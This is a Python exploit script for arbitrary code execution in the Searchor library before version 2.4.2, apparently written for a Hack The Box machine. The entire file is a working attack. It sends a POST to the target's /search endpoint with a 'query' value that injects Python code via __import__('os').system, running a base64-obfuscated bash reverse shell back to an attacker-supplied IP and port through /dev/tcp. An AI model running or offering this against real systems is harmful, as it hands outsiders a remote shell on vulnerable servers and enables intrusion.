#!/bin/python3

# Arbitrary Code Execution in Searchor < 2.4.2

import requests, base64, sys

# Checks for arguments.
if len(sys.argv) < 4:
    print("[-] Arguments required!")
    print(f'[!] Command: python3 ./{sys.argv[0]} <TARGET> <LISTENER-IP> <LISTENER-PORT>')
    print("[!] <TARGET> es. http://searcher.htb with searchor 2.4.0")
    exit()

# Global variables
URL = sys.argv[1] + "/search"
LISTENING_IP = sys.argv[2]
LISTENING_PORT = sys.argv[3]

# Exploits `Searchor 2.4.0` and creates reverse shell
def exploit(url):
    
    payload = f"/bin/bash -c 'bash -i>&/dev/tcp/{LISTENING_IP}/{LISTENING_PORT} 0>&1'"
    encoded_payload = base64.b64encode(payload.encode()).decode()
    payloadEncrypt = f"echo {encoded_payload} | base64 -d | sh"
    
    dati = {
        'engine': 'BBC',
        'query': "', __import__('os').system('{}') ) # ".format(payloadEncrypt)
    }

    r = requests.post(url, data=dati)

# Main
if __name__ == "__main__":
    exploit(URL)
